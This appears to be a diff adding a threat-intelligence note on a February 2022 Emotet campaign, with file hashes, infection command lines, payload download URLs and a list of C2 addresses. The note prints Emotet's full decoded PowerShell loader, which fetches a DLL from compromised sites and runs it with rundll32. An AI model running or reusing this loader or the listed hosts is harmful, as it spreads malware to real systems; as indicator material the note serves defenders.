@@ -1,0 +1,89 @@
+Emotet 2022 - 09.02.2022 - epoch5
+
+************************************************************************************************************
+
+.xls 3ca22d8de0a22814a9a0a0971cf8aee30cfe53d3cc8fcc62f78ba545ea3cd5c6
+
+.dll 3486b2c85f7a0f66d2939738ba6b0e041c8856ba6ad314f2e8822699d4427b84
+
+wscript c:\programdata\tjspowj.vbs
+
+cmd.exe /c C:\programdata\uidpjewl.bat
+
+powershell  -enc $mjxdfshdrfgzses4 = "http://alivesystems.com/eln-images/pm2rSsnVM/", "http://don-lee.com/_notes/U6H14DNA/", "http://mellow60s.com/Stanley_files/EFIqwZ183rfmd/", "http://pro-ficientllc.com/PDF_files/5A9W8/", "http://lost-earth.com/Black_and_White/ZW4rHEdD1vZX/", "http://creedmoorpartners.com/eln-images/wEYKd5KJZETheBswq/", "http://mattersoffact.com/cgi/E0C1vtSqt/", "http://pureplatinumband.com/Schedule/EW24AYJCvBpN8Gc/", "http://homehandyworks.com/eln-images/xFIDPfs4SS1yw7ghXXk/", "http://hi-techaudio.com/dir2021/g3d/", "http://roderickpowellentertainment.com/eln-images/OVOyN3y9/", "https://consciences.center/wp-includes/SkW2w/", "http://mag-designs.com/css/L3QKlr6iTzILVzbnC/"
+foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
+  $gweyh57sedswd = "c:\\programdata\\puihoud.dll"
+  invoke-webrequest -uri $yidsrhye34syufgxjcdf -outfile $gweyh57sedswd
+  if (test-path "c:\\programdata\\puihoud.dll") {
+    if ((get-item "c:\\programdata\\puihoud.dll").length -ge 47436) {
+      break
+    }
+  }
+}
+
+
+cmd.exe /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\puihoud.dll,tjpleowdsyf
+
+c:\windows\syswow64\rundll32.exe  c:\programdata\puihoud.dll,tjpleowdsyf
+
+C:\Windows\SysWOW64\rundll32.exe "c:\programdata\puihoud.dll",DllRegisterServer
+
+C:\Windows\SysWOW64\rundll32.exe "C:\Windows\SysWOW64\Egmsgwkioe\yqhmuwiuncnlul.dsr",IivICkzJYSdsZh
+
+C:\Windows\SysWOW64\rundll32.exe "C:\Windows\System32\Egmsgwkioe\yqhmuwiuncnlul.dsr",DllRegisterServer
+
+
+.dll distro
+
+http://alivesystems.com/eln-images/pm2rSsnVM/
+http://don-lee.com/_notes/U6H14DNA/
+http://mellow60s.com/Stanley_files/EFIqwZ183rfmd/
+http://pro-ficientllc.com/PDF_files/5A9W8/
+http://lost-earth.com/Black_and_White/ZW4rHEdD1vZX/
+http://creedmoorpartners.com/eln-images/wEYKd5KJZETheBswq/
+http://mattersoffact.com/cgi/E0C1vtSqt/
+http://pureplatinumband.com/Schedule/EW24AYJCvBpN8Gc/
+http://homehandyworks.com/eln-images/xFIDPfs4SS1yw7ghXXk/
+http://hi-techaudio.com/dir2021/g3d/
+http://roderickpowellentertainment.com/eln-images/OVOyN3y9/
+https://consciences.center/wp-includes/SkW2w/
+http://mag-designs.com/css/L3QKlr6iTzILVzbnC/
+
+c2's
+
+198.199.126.144:443
+103.42.57.17:8080
+195.154.146.35:443
+104.131.62.48:8080
+116.124.128.206:8080
+54.38.242.185:443
+217.182.143.207:443
+66.42.57.149:443
+185.148.168.220:8080
+37.44.244.177:8080
+78.47.204.80:443
+173.203.78.138:443
+190.90.233.66:443
+203.153.216.46:443
+54.37.106.167:8080
+194.9.172.107:8080
+168.197.250.14:80
+185.184.25.78:8080
+191.252.103.16:80
+159.69.237.188:443
+85.214.67.203:8080
+78.46.73.125:443
+59.148.253.194:443
+118.98.72.86:443
+62.171.178.147:8080
+195.77.239.39:8080
+185.148.168.15:8080
+139.196.72.155:8080
+54.37.228.122:443
+37.59.209.141:8080
+198.199.98.78:8080
+93.104.208.37:8080
+103.41.204.169:8080
+128.199.192.135:8080
+210.57.209.142:8080
+207.148.81.119:8080
